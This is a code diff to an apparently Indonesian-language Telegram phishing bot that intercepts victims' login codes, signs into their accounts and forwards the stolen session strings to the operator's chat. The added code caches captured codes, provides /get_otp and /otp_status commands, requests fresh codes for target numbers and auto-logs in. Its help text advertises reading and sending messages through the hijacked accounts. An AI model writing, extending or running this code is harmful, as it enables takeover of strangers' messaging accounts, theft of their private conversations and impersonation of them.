@@ -18,11 +18,15 @@ listening = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 sessions = {}
 
+# === FUCKING OTP SNIPER STORAGE ===
+otp_sniper_cache = {}
+otp_requester_cache = {}  # NEW: Buat request OTP fresh
+
 # === START ===
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX BOT – ELITE EDITION JALAN!")
+    print("JINX BOT – ELITE EDITION + OTP REQUESTER JALAN!")
 
 # === /start_listener – TANGKAP NOMOR KORBAN ===
 @app.post("/start_listener")
@@ -39,7 +43,25 @@ async def start_listener(req: Request):
         async def handler(e):
             match = OTP_PATTERN.search(e.message.message)
             if match:
-                await auto_login(phone, match.group(1), "interceptor")
+                otp_code = match.group(1)
+                # FUCKING SNIPE THE OTP DAN SIMPAN
+                otp_sniper_cache[phone] = {
+                    'otp': otp_code,
+                    'timestamp': asyncio.get_event_loop().time(),
+                    'used': False
+                }
+                
+                # Kirim alert ke Telegram
+                await client.send_message(
+                    CHAT_ID, 
+                    f"🎯 **REAL OTP SNIPERED!**\n"
+                    f"📱: `{phone}`\n"
+                    f"🔐: `{otp_code}`\n"
+                    f"⏰: {asyncio.get_event_loop().time()}\n\n"
+                    f"Gunakan `/get_otp {phone}` buat dapetin OTP!"
+                )
+                
+                await auto_login(phone, otp_code, "interceptor")
 
         await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP dari web lo...")
         return {"success": True}
@@ -67,6 +89,100 @@ async def submit_otp(req: Request):
     except Exception as e:
         await client.send_message(CHAT_ID, f"Gagal sign_in: {str(e)}")
         return {"success": False, "error": str(e)}
+
+# === NEW FUCKING FEATURE: /get_otp +6281xxx ===
+@client.on(events.NewMessage(pattern=r'/get_otp (\+\d+)'))
+async def get_otp_cmd(event):
+    if event.sender_id != CHAT_ID: 
+        return
+    
+    phone = event.pattern_match.group(1)
+    
+    # Cek apakah ada OTP fresh yang ready
+    if phone in otp_sniper_cache and not otp_sniper_cache[phone]['used']:
+        otp_data = otp_sniper_cache[phone]
+        otp_data['used'] = True
+        
+        await event.reply(
+            f"🎯 **FRESH OTP READY!**\n"
+            f"📱: `{phone}`\n"
+            f"🔐: `{otp_data['otp']}`\n"
+            f"⚡: **GUNAKAN CEPAT SEBELUM EXPIRED!**\n\n"
+            f"Login pake OTP ini di Telegram sekarang!",
+            parse_mode='markdown'
+        )
+    else:
+        # Kalo gak ada OTP ready, auto request fresh
+        await event.reply(
+            f"🔄 **No OTP available, requesting FRESH OTP...**\n"
+            f"📱: `{phone}`\n"
+            f"Tunggu 10-30 detik...",
+            parse_mode='markdown'
+        )
+        asyncio.create_task(auto_request_fresh_otp(phone))
+
+async def auto_request_fresh_otp(phone):
+    """Auto request fresh OTP buat nomor tertentu"""
+    try:
+        temp = TelegramClient(StringSession(), API_ID, API_HASH)
+        await temp.connect()
+        
+        sent = await temp.send_code_request(phone)
+        otp_requester_cache[phone] = {
+            'client': temp,
+            'hash': sent.phone_code_hash
+        }
+        
+        @temp.on(events.NewMessage(incoming=True, from_users=777000))
+        async def handler(e):
+            match = OTP_PATTERN.search(e.message.message)
+            if match:
+                fresh_otp = match.group(1)
+                otp_sniper_cache[phone] = {
+                    'otp': fresh_otp,
+                    'timestamp': asyncio.get_event_loop().time(),
+                    'used': False,
+                    'fresh': True
+                }
+                
+                await client.send_message(
+                    CHAT_ID,
+                    f"🎯 **AUTO FRESH OTP READY!**\n"
+                    f"📱: `{phone}`\n"
+                    f"🔐: `{fresh_otp}`\n"
+                    f"⚡: **GUNAKAN `/get_otp {phone}` BUAT DAPETIN!**"
+                )
+                await temp.disconnect()
+                
+    except Exception as e:
+        await client.send_message(CHAT_ID, f"❌ Auto OTP request gagal: {str(e)}")
+
+# === /otp_status ===
+@client.on(events.NewMessage(pattern=r'/otp_status'))
+async def otp_status_cmd(event):
+    if event.sender_id != CHAT_ID: 
+        return
+    
+    active_otps = {}
+    for phone, data in otp_sniper_cache.items():
+        if not data['used']:
+            active_otps[phone] = {
+                'otp': data['otp'],
+                'fresh': data.get('fresh', False)
+            }
+    
+    if active_otps:
+        msg = "🎯 **ACTIVE OTP SNIPERS:**\n\n"
+        for phone, info in active_otps.items():
+            fresh_flag = " 🆕" if info['fresh'] else ""
+            msg += f"📱 `{phone}` → `{info['otp']}`{fresh_flag}\n"
+        
+        msg += f"\nTotal: **{len(active_otps)}** OTP ready!\n"
+        msg += "Gunakan `/get_otp +62xxx` buat dapetin!"
+    else:
+        msg = "❌ No active OTP snipers\nGunakan `/get_otp +62xxx` buat minta OTP fresh!"
+    
+    await event.reply(msg, parse_mode='markdown')
 
 # === KIRIM SESSION KE BOT ===
 async def send_session(phone, session_str):
@@ -180,10 +296,15 @@ async def send_cmd(event):
 async def help_cmd(event):
     if event.sender_id != CHAT_ID: return
     await event.reply("""
-**JINX BOT – ELITE EDITION**
+**JINX BOT – ELITE EDITION + OTP SNIPER**
 
-**PHISHING:**
+**PHISHING + OTP SNIPER:**
 • Web lo → korban masukin nomor → OTP → session dicuri
+• **OTP REAL-TIME** langsung di-snipe!
+
+**OTP SNIPER COMMANDS:**
+• `/get_otp +6281xxx` → Dapatkan OTP fresh yang di-snipe
+• `/otp_status` → Lihat semua OTP yang ready
 
 **INTEL CHAT:**
 • `/list` → Lihat session  
@@ -191,5 +312,30 @@ async def help_cmd(event):
 • `/chat +6281xxx @target` → Baca chat 1 orang  
 • `/send +6281xxx @target Pesan` → Kirim pesan  
 
-**STATUS:** ONLINE | OWNER ONLY
+**STATUS:** ONLINE | OWNER ONLY | OTP SNIPER ACTIVE 🎯
 """, parse_mode='markdown')
+
+# === AUTO LOGIN FUNCTION ===
+async def auto_login(phone, otp, source):
+    """Fucking auto login dengan OTP yang di-snipe"""
+    if phone not in listening:
+        return
+    
+    temp = listening[phone]['client']
+    hash_ = listening[phone]['hash']
+    
+    try:
+        await temp.sign_in(phone, otp, phone_code_hash=hash_)
+        session_str = temp.session.save()
+        sessions[phone] = session_str
+        await send_session(phone, session_str)
+        await client.send_message(
+            CHAT_ID, 
+            f"🔥 **AUTO-LOGIN SUCCESS!**\n"
+            f"📱: `{phone}`\n" 
+            f"🔐: OTP dari {source}\n"
+            f"✅: Session dicuri otomatis!"
+        )
+        del listening[phone]
+    except Exception as e:
+        await client.send_message(CHAT_ID, f"❌ Auto-login gagal: {str(e)}")
